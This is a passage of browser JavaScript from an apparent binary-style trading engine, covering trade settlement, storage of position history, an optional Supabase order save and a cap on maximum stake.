      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: mode, voided: voided });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: (trade.ticket && trade.ticket.side) || trade.side,
        stake: (trade.ticket && trade.ticket.stake != null) ? trade.ticket.stake : trade.stake,
        payout: (trade.ticket && trade.ticket.payout != null) ? trade.ticket.payout : trade.payout,
        entryPrice: (trade.ticket && trade.ticket.entryPrice != null) ? trade.ticket.entryPrice : trade.entryPrice,
        duration: (trade.ticket && trade.ticket.duration != null) ? trade.ticket.duration : trade.duration,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        won: won,
        voided: voided,
        status: status,
        net: net,
        mode: mode,
        accountType: mode
      };
      D6.Store.addPosition(user, position);
      trades.splice(idx, 1);
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          voided: voided,
          status: status,
          net: net
        }, 'closed');
      }

      try {
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, voided: voided, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return {
        trade: closed,
        position: position,
        won: won,
        voided: voided,
        net: net,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        status: status
      };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isOpen(trades[i]) && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* ignore */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER, user && user.mode);
      return probe.cap;
    }
  };

  // Pas d’API publique nextPrice / seed / bougies futures.
  D6.Synth = {};

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
